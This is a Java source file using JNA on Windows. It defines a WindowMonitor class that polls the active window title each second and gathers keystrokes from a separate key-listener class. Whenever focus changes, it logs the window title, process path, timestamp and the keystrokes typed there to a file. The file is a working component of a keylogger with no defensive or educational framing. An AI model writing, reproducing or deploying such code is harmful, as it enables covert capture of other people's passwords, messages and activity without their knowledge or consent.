import com.sun.jna.Native;
import com.sun.jna.platform.win32.*;
import com.sun.jna.ptr.IntByReference;

import java.text.SimpleDateFormat;
import java.util.Date;

class WindowMonitor {
    private static final StringBuilder currentWindowBuffer = new StringBuilder();
    public static String currentWindow = "";

    public static void monitorWindows(KeyListenerHandler keyListener) {
        String previousTitle = "";
        while (true) {
            try {
                Thread.sleep(1000);
                char[] buffer = new char[1024];
                WinDef.HWND hwnd = User32.INSTANCE.GetForegroundWindow();
                User32.INSTANCE.GetWindowText(hwnd, buffer, 1024);
                String windowTitle = Native.toString(buffer).trim();

                if (!windowTitle.equals(previousTitle) && !windowTitle.isEmpty()) {
                    if (!previousTitle.isEmpty()) {
                        writeWindowInfo(previousTitle, currentWindowBuffer.toString());
                        currentWindowBuffer.setLength(0);
                    }
                    previousTitle = windowTitle;
                }
                currentWindowBuffer.append(keyListener.flushKeyBuffer());
                currentWindow = windowTitle;
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private static void writeWindowInfo(String windowTitle, String keyLogs) {
        int pid = getProcessId(windowTitle);
        String processPath = getProcessPath(pid);
        String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date());
        String log = "[Time:] " + timestamp + "\n" +
                "[Window Title]: " + windowTitle + "\n" +
                "[Process Path]: " + processPath + "\n" +
                "[Log]: " + keyLogs + "\n";
        LogFileHandler.writeToFile(log);
    }

    private static int getProcessId(String windowTitle) {
        IntByReference pid = new IntByReference();
        WinDef.HWND hwnd = User32.INSTANCE.FindWindow(null, windowTitle);
        User32.INSTANCE.GetWindowThreadProcessId(hwnd, pid);
        return pid.getValue();
    }

    private static String getProcessPath(int pid) {
        WinNT.HANDLE process = Kernel32.INSTANCE.OpenProcess(Kernel32.PROCESS_QUERY_INFORMATION | Kernel32.PROCESS_VM_READ, false, pid);
        if (process == null) {
            return "Unknown";
        }

        try {
            byte[] buffer = new byte[1024];
            Psapi.INSTANCE.GetModuleFileNameExA(process, null, buffer, buffer.length);
            return Native.toString(buffer);
        } finally {
            Kernel32.INSTANCE.CloseHandle(process);
        }
    }
}